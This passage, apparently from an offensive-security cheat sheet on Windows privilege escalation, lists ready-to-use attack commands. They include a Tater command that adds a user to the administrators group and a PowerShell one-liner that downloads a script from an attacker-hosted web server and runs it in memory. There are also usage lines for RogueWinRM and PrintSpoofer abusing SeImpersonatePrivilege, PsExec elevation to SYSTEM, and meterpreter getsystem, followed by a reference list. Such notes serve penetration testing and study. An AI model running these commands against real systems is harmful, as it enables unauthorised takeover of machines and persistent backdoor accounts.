. ./Tater.ps1

# Trigger (Default = 1): Trigger type to use in order to trigger HTTP to SMB relay.
0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task

Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add"

# Memory injection and run
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
```

###### RogueWinRM

Starting from `Windows 10 1809` (and `Windows Server 2019` if the `WinRM`
service is not already started), `RogueWinRM` can be used to exploit the
`SeImpersonatePrivilege` privilege.

```
RogueWinRM -p <BINARY_PATH | C:\windows\system32\cmd.exe> [-a "<COMMAND_LINE_ARGUMENTS>"]
```

###### PrintSpoofer

If the `Print Spooler` service is running locally (or can be started),
`PrintSpoofer` can be used to exploit the `SeImpersonatePrivilege` privilege
(tested on `Windows 10` and `Windows Server 2016 / 2019`).

```
# Checks if the Print Spooler service is running.
sc qc Spooler
Get-Service -Name Spooler

# Attempts to start the Print Spooler service.
net start Spooler
Start-Service -Name Spooler

# -i: interactive process. Default is non-interactive.
PrintSpoofer.exe [-i] -c "<cmd.exe | powershell.exe | BINARY_PATH | cmd.exe COMMAND_LINE_ARGUMENTS | ...>"
```

### Administrator to SYSTEM

The `NT AUTHORITY\ SYSTEM` account and the members of the `Administrators`
local group have the same file privileges, but they have different functions.  
The system account is used by the operating system and by services that run
under Windows. It is an internal account, does not show up in User Manager,
cannot be added to any groups, and cannot have user rights assigned to it.  
The system account is needed by tools that make us of Debug Privilege
(such as `mimikatz`) which allows someone to debug a process that they wouldn’t
otherwise have access to.

The `PsExec` Microsoft signed tool can be used to elevate to system privilege
from an administrator account:

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec.exe -accepteula -s -i -d cmd.exe
```

If a `meterpreter` shell is being used, the `getsystem` command can be
leveraged to the same end.

--------------------------------------------------------------------------------

### References

https://stackoverflow.com/questions/1331887/detect-antivirus-on-windows-using-c-sharp
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
https://ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
https://www.elastic.co/fr/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
https://docs.microsoft.com/fr-fr/windows/desktop/SecAuthZ/ace-strings
https://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
http://www.alex-ionescu.com/publications/BlueHat/bluehat2016.pdf
https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Linux-Vulnerabilities_Windows-Exploits--Escalating-Privileges-with-WSL.pdf
https://resources.infosecinstitute.com/windows-subsystem-linux/#gref
https://mspscripts.com/get-installed-antivirus-information-2/
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
https://itm4n.github.io/localservice-privileges/
https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights
